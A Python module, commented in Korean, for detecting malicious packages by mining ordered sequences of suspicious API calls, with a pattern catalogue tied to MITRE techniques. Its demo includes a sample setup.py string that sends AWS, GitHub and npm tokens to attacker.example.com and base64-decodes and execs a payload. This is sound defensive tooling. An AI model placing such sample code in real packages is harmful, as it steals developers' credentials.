"""
Sequential Pattern Mining for malicious behavior detection.

근거: Unveiling Malicious Logic in Open-Source Packages (2025)
       https://arxiv.org/html/2512.12559v1

목적:
  단순 dimension 집합(set) 기반이 아니라 "시퀀스 순서" 까지 검사한다.
  예) info_read → encode → network_send 가 이 순서로 등장하면 매우 의심.
      반대로 network_recv 후 exec 이 등장하면 RCE.

설계:
  하나의 SequencePattern 은 (min, max) 반복을 가진 dimension 슬롯의 정규식.
  탐욕(greedy) 매칭으로 한 FileSequence 안에서 매칭되는 첫 번째 부분배열을 찾는다.

  슬롯 dimension:
    - "INFORMATION_READING"
    - "ENCODING"
    - "PAYLOAD_EXECUTION"
    - "DATA_TRANSMISSION"
    - "ANY"  (어떤 dimension 이든 매칭, optional)
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional

from ..schema import AttackDimension, Severity
from .stage2_behavior import APICall, FileSequence, BehaviorReport


# ─────────────── 슬롯 / 패턴 ───────────────

@dataclass
class SeqSlot:
    """하나의 시퀀스 슬롯 — 특정 dimension 을 min~max 회 매칭."""
    dim: str          # "INFORMATION_READING" 또는 "ANY"
    min: int = 1
    max: int = 1


@dataclass
class SequencePattern:
    code: str                  # 예: "SP-001"
    name: str
    description: str
    severity: Severity
    slots: list[SeqSlot]
    related_ttps: list[str] = field(default_factory=list)


@dataclass
class SequenceMatch:
    pattern: SequencePattern
    file_path: str
    matched_calls: list[APICall]
    span: tuple[int, int]      # 매칭된 calls 의 [start, end] 인덱스 (end exclusive)

    def to_summary(self) -> str:
        names = " -> ".join(c.name for c in self.matched_calls)
        return f"{self.pattern.code} [{self.pattern.name}]: {names}"


@dataclass
class SequenceMineReport:
    matches: list[SequenceMatch] = field(default_factory=list)
    error: Optional[str] = None


# ─────────────── 패턴 카탈로그 ───────────────

PATTERNS: list[SequencePattern] = [
    # SP-001: 자격증명 탈취
    SequencePattern(
        code="SP-001",
        name="Credential exfiltration",
        description="환경변수/파일 읽기 → (선택적 인코딩) → 네트워크 송신",
        severity=Severity.HIGH,
        slots=[
            SeqSlot("INFORMATION_READING", min=1, max=5),
            SeqSlot("ENCODING", min=0, max=3),
            SeqSlot("DATA_TRANSMISSION", min=1, max=2),
        ],
        related_ttps=["T1552.001", "T1041", "T1048.003"],
    ),

    # SP-002: 다운로드 후 실행 (curl|bash 류)
    SequencePattern(
        code="SP-002",
        name="Download-and-execute",
        description="네트워크 수신 → 실행",
        severity=Severity.HIGH,
        slots=[
            SeqSlot("DATA_TRANSMISSION", min=1, max=2),
            SeqSlot("PAYLOAD_EXECUTION", min=1, max=2),
        ],
        related_ttps=["T1105", "T1059"],
    ),

    # SP-003: 인코딩 후 실행 (base64 -> exec)
    SequencePattern(
        code="SP-003",
        name="Encoded payload execution",
        description="인코딩 디코드 → 실행",
        severity=Severity.HIGH,
        slots=[
            SeqSlot("ENCODING", min=1, max=3),
            SeqSlot("PAYLOAD_EXECUTION", min=1, max=2),
        ],
        related_ttps=["T1027", "T1059", "T1140"],
    ),

    # SP-004: 시스템 정보 수집 → 송신
    SequencePattern(
        code="SP-004",
        name="System reconnaissance + exfil",
        description="시스템 정보 다중 읽기 → 송신",
        severity=Severity.MEDIUM,
        slots=[
            SeqSlot("INFORMATION_READING", min=2, max=10),
            SeqSlot("DATA_TRANSMISSION", min=1, max=2),
        ],
        related_ttps=["T1082", "T1057", "T1041"],
    ),

    # SP-005: 정보읽기 → 실행 (예: env-controlled exec)
    SequencePattern(
        code="SP-005",
        name="Info-driven execution",
        description="정보 읽기 → 즉시 실행",
        severity=Severity.MEDIUM,
        slots=[
            SeqSlot("INFORMATION_READING", min=1, max=3),
            SeqSlot("PAYLOAD_EXECUTION", min=1, max=2),
        ],
        related_ttps=["T1059", "T1106"],
    ),

    # SP-006: 풀 체인 — info+encode+exec+exfil 모두 등장
    SequencePattern(
        code="SP-006",
        name="Full kill-chain",
        description="정보 수집 → 인코딩 → 실행 → 송신 (완전 체인)",
        severity=Severity.HIGH,
        slots=[
            SeqSlot("INFORMATION_READING", min=1, max=10),
            SeqSlot("ENCODING", min=1, max=5),
            SeqSlot("PAYLOAD_EXECUTION", min=1, max=3),
            SeqSlot("DATA_TRANSMISSION", min=1, max=3),
        ],
        related_ttps=["T1059", "T1041", "T1027"],
    ),
]


# ─────────────── 탐욕 매칭 ───────────────

def _slot_matches_dim(slot: SeqSlot, dim: AttackDimension) -> bool:
    if slot.dim == "ANY":
        return True
    return slot.dim == dim.value


def _match_pattern_at(
    calls: list[APICall],
    start: int,
    pattern: SequencePattern,
) -> Optional[tuple[int, int]]:
    """`calls[start:]` 에서 패턴이 시작 가능한지 검사.

    탐욕적으로 각 슬롯을 가능한 만큼 채운 뒤, 다음 슬롯도 만족하는지 확인.
    Min 만 보장하면 OK; 슬롯 사이에 다른 dimension 호출이 끼면 매칭 실패.

    반환: (slot_index 가 끝났을 때의 calls index 끝) 또는 None.
    """
    pos = start
    n = len(calls)
    for slot in pattern.slots:
        # 이 슬롯을 가능한 한 max 만큼 매칭
        count = 0
        while pos < n and _slot_matches_dim(slot, calls[pos].dimension) and count < slot.max:
            pos += 1
            count += 1
        if count < slot.min:
            return None
    return (start, pos)


def _mine_sequence_in_file(file_seq: FileSequence) -> list[SequenceMatch]:
    """한 파일의 calls 리스트 안에서 모든 패턴 매칭."""
    matches: list[SequenceMatch] = []
    n = len(file_seq.calls)
    for pat in PATTERNS:
        # 한 파일에서 같은 패턴은 최대 한 번만 보고 (중복 제거)
        for i in range(n):
            span = _match_pattern_at(file_seq.calls, i, pat)
            if span is not None:
                a, b = span
                if b - a >= sum(s.min for s in pat.slots):
                    matches.append(SequenceMatch(
                        pattern=pat,
                        file_path=file_seq.path,
                        matched_calls=file_seq.calls[a:b],
                        span=(a, b),
                    ))
                    break  # 같은 패턴은 1회만
    return matches


def mine(behavior: BehaviorReport) -> SequenceMineReport:
    rpt = SequenceMineReport()
    try:
        for fs in behavior.files:
            rpt.matches.extend(_mine_sequence_in_file(fs))
    except Exception as e:
        rpt.error = f"{type(e).__name__}: {e}"
    return rpt


# ─────────────── CLI ───────────────

if __name__ == "__main__":
    from .stage1_entry_point import EntryFile
    from .stage2_behavior import _analyze_python

    sample = '''
import os, base64, requests, subprocess

def evil():
    a = os.environ.get("AWS_KEY")
    b = os.environ.get("GITHUB_TOKEN")
    c = os.environ.get("NPM_TOKEN")
    enc = base64.b64encode(str([a, b, c]).encode())
    requests.post("https://attacker.example.com", data=enc)

def reverse_shell():
    payload = base64.b64decode("ZXhlYygncm0nKQ==")
    exec(payload)

def downloader():
    out = subprocess.check_output(["whoami"])
    requests.put("https://x.com", data=out)
'''
    fs = _analyze_python(EntryFile(
        path="evil/setup.py", basename="setup.py",
        content=sample, size=len(sample), language="python",
    ))
    print(f"Calls: {len(fs.calls)}")
    for c in fs.calls:
        print(f"  L{c.line:>3}  [{c.dimension.value[:4]}]  {c.name}")

    print()
    behavior = BehaviorReport(files=[fs])
    rpt = mine(behavior)
    print(f"Patterns matched: {len(rpt.matches)}")
    for m in rpt.matches:
        print(f"  {m.to_summary()}")
        print(f"    severity={m.pattern.severity.value}, ttps={m.pattern.related_ttps}")
